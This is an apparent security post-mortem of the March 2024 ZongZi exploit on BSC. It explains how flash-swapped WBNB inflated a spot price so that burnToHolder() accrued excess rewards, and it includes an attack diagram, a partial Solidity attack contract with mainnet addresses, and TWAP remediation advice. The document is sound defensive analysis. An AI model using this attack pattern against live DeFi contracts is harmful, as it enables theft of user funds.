# ZongZi — burnToHolder Spot Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-03 |
| **Protocol** | ZongZi |
| **Chain** | BSC |
| **Loss** | ~$223,000 |
| **Attack Contract** | [0x0bd0D9BA](https://bscscan.com/address/0x0bd0D9BA4f52dB225B265c3Cffa7bc4a418D22A9) |
| **Vulnerable Contract** | [0xB7a25423](https://bscscan.com/address/0xB7a254237E05cccA0a756f75FB78Ab2Df222911b) |
| **ZongZi Token** | [0xBB652D0f](https://bscscan.com/address/0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68) |
| **WBNB/ZongZi Pair** | [0xD695C08a](https://bscscan.com/address/0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe) |
| **Root Cause** | The `burnToHolder()` function uses DEX `getReserves()` spot reserve-based pricing, allowing within-block reserve manipulation to accumulate excessive rewards, which are then drained via `receiveRewards()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/ZongZi_exp.sol) |

---

## 1. Vulnerability Overview

The `burnToHolder()` function in the ZongZi protocol calculates the ZongZi token price using PancakeSwap pair spot reserves to accrue rewards. The attacker borrowed WBNB via a BUSDT/WBNB flash swap, manipulated the price by swapping WBNB→ZongZi, then called `burnToHolder()` twice to accumulate a large amount of rewards at the manipulated price, and finally withdrew them via `receiveRewards()`.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: burnToHolder uses spot reserve price
interface IZZF {
    function burnToHolder(uint256 amount, address _invitation) external;
    function receiveRewards(address to) external;
}

// Internal implementation (same pattern as Burns DeFi)
function burnToHolder(uint256 amount, address _invitation) external {
    (uint112 r0, uint112 r1,) = pair.getReserves();
    uint256 price = uint256(r0) * 1e18 / uint256(r1);  // ← spot price manipulable
    uint256 reward = amount * price / 1e18;
    pendingRewards[_invitation] += reward;
    _burn(msg.sender, amount);
}

// ✅ Safe code: TWAP-based price
function burnToHolder(uint256 amount, address _invitation) external {
    uint256 twapPrice = getTWAPPrice(1800);  // 30-minute TWAP
    uint256 reward = amount * twapPrice / 1e18;
    pendingRewards[_invitation] += reward;
    _burn(msg.sender, amount);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: ZongZi_decompiled.sol
contract ZongZi {
    function burnToHolder(uint256 p0, address p1) external {}  // ❌ vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Flash swap from BUSDT/WBNB pair: borrow WBNB
  │
  ├─→ [2] Swap WBNB → ZongZi (ZongZi price increases)
  │
  ├─→ [3] Call burnToHolder(amount/2, invitation) — 1st call
  │         └─ Rewards accumulated at manipulated spot price
  │
  ├─→ [4] Call burnToHolder(amount/2, invitation) — 2nd call
  │
  ├─→ [5] receiveRewards(attacker) — collect accumulated rewards
  │
  ├─→ [6] Swap accumulated ZongZi → WBNB (reverse swap)
  │
  └─→ [7] Repay flash swap + ~$223K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IZZF {
    function burnToHolder(uint256 amount, address _invitation) external;
    function receiveRewards(address to) external;
}

interface Uni_Pair_V2 {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract AttackContract {
    IZZF        constant zzf     = IZZF(0xB7a254237E05cccA0a756f75FB78Ab2Df222911b);
    Uni_Pair_V2 constant busdPair = Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IERC20      constant ZZF     = IERC20(0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68);
    IERC20      constant WBNB    = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    function testExploit() external {
        // [1] Borrow WBNB via flash swap
        busdPair.swap(0, wbnbAmount, address(this), abi.encode("flashswap"));
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        // [2] Price manipulation swap: WBNB → ZongZi
        swapWBNBToZongZi(wbnbAmount);

        // [3] Call burnToHolder twice (accumulate rewards at manipulated price)
        uint256 zzfBal = ZZF.balanceOf(address(this));
        zzf.burnToHolder(zzfBal / 2, address(this));
        zzf.burnToHolder(zzfBal / 2, address(this));

        // [4] Collect accumulated rewards
        zzf.receiveRewards(address(this));

        // [5] Reverse swap + repay flash swap
        swapZongZiToWBNB(ZZF.balanceOf(address(this)));
        WBNB.transfer(address(busdPair), wbnbAmount + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Flash loan-based spot price manipulation |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **Attack Vector** | External (flash swap + burnToHolder reward manipulation) |
| **DApp Category** | Reward token / DeFi burn mechanism |
| **Impact** | Reward pool fund theft (~$223K) |

## 6. Remediation Recommendations

1. **Apply TWAP Oracle**: Change the price used inside `burnToHolder()` to a 30-minute TWAP
2. **Delayed Reward Distribution**: Replace immediate payout with a claim-after-N-blocks model
3. **Maximum Reward Cap**: Limit the maximum rewards that can be accumulated per single call
4. **Price Deviation Check**: Block reward calculation if the spot price deviates more than 5% from the TWAP

## 7. Lessons Learned

- The `burnToHolder()` pattern combined with DEX spot price dependency is a recurring target for flash loan attacks.
- The same pattern has been exploited across multiple protocols, including Burns DeFi (2024-02) and BurnsDefi variants.
- Any function that uses an instantly manipulable spot price for reward calculation must be replaced with TWAP.